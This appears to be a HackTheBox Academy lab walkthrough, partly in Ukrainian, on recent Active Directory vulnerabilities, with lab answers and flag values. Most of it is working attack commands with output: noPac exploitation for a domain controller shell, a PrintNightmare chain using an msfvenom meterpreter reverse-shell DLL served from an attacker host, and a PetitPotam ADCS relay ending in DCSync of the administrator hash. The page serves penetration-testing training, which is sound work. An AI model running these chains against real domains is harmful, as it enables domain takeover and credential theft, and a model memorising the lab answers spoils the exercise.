Bleeding Edge Vulnerabilities
ℹ️ Informations
🌐 Website: HackTheBox

📚 Module: Active Directory Enumeration & Attacks

🔗 Link: Bleeding Edge Vulnerabilities

❓ Question 1
Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)

📋 Walkthrough
SSH до attack host та запустити scanner з NoPac:

bash
ssh htb-student@10.129.26.41
# Password: HTB_@cademy_stdnt!

cd /opt/noPac
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
text
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
NoPac об'єднує два CVE: 42278 (bypass SAM) та 42287 (Kerberos PAC в ADDS).

✅ Answer: 2021-42278&2021-42287

❓ Question 2
Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.

📋 Walkthrough
bash
ssh htb-student@10.129.26.41
# Password: HTB_@cademy_stdnt!

cd /opt/noPac

# Отримати shell через NoPac
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
  -dc-ip 172.16.5.5 \
  -dc-host ACADEMY-EA-DC01 \
  -shell --impersonate administrator -use-ldap
text
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
Отримали semi-interactive shell. Читаємо флаг (використовуємо повний шлях, бо smbexec):

text
C:\Windows\system32> type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
text
D0ntSl@ckonN0P@c!
✅ Answer: D0ntSl@ckonN0P@c!

📖 Додатково: PrintNightmare (CVE-2021-1675)
bash
# Перевірка наявності MS-RPRN/MS-PAR
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Генерація DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Хостинг через SMB
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Запуск експлойту
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 \
  '\\172.16.5.225\CompData\backupscript.dll'
📖 Додатково: PetitPotam (CVE-2021-36942)
bash
# Термінал 1 — запуск relay
sudo ntlmrelayx.py -debug -smb2support \
  --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Термінал 2 — тригер автентифікації DC
python3 PetitPotam.py 172.16.5.225 172.16.5.5

# Отримаємо base64 certificate → зберегти як dc01.b64

# Запит TGT через сертифікат
python3 /opt/PKINITtools/gettgtpkinit.py \
  INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$ \
  -pfx-base64 <base64_cert> dc01.ccache

# Встановити ccache
export KRB5CCNAME=dc01.ccache

# DCSync через TGT
secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
  -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
text
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
